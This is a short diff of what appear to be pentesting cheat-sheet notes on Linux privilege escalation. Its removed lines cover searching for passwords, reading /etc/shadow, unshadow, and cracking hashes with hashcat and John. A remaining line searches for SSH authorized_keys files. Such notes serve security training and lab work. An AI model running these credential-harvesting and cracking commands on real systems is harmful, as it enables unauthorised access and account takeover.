@@ -1,27 +1,3 @@
-User enum
-
-User folders
-Whoami
-Id
-/etc/passwd/
-Grep usernames - Grep --color=auto -rnw '/' -ie "password" --color=always 2> /dev/null
-
-Password and sensitive file hunting
-Grep --color=auto -rnw '/' -ie "password" --color=always 2> /dev/null
-Locate password | more
-
-History
-
-Ls -la then cat .bash_history
-
-Write contents of /etc/passwd and /etc/shadow to 2 diff files - then use tool called unshadow
-unshadow passwordfile.txt shadowfile.txt > unshadowed.txt
-(only works if access to shadow passwd) - ls -la /etc/shadow
-Then crack with hashcat -hashcat -m 1800 unshadowex.txt wordlist.txt -O
-Crack with John - john --wordlist=/home/kali/rockyou.txt hashname.txt
-
-See if /etc/shadow is writeable - ls -la /etc/shadow
-mkpasswd -m sha-512 yourpasswordhere
 
 Finding SSH Keys
 find / -name authorized_keys 2> /dev/null
